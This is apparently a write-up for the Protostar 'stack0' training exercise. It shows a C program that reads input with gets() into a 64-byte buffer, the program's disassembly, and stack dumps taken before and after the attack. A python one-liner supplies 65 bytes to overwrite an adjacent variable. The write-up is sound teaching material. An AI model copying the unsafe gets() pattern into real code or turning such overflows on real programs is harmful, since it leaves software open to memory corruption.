---
layout: default
---

Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

`main` function:
```asm
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
```
From the asm of `main`, we find that:
1. `buffer` occupies `esp + 0x1c` until `esp + 0x58`. It is supposed to be 64-byte long.
2. `modified` occupies `esp + 0x5c`.

So, here are 96 bytes of memory starting at esp, before we input a value for <span style="color:aqua">buffer</span>:
<pre>
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      <span style="color:aqua">0xb7eada75</span>
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08049620</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x080482e8</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x08049620</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048469</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048450</span>      <span style="color:aqua">0xbffff7a8</span>
0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804845b</span>      <span style="color:orangered">0x00000000</span>
</pre>

and after:
<pre>
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      <span style="color:aqua">0x41414141</span>
0xbffff760:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
0xbffff770:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
0xbffff780:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
0xbffff790:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x00000078</span>
</pre>

buffer value:
```bash
python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + 'x'" > input.txt
```
stack0 < input.txt

[back](./)
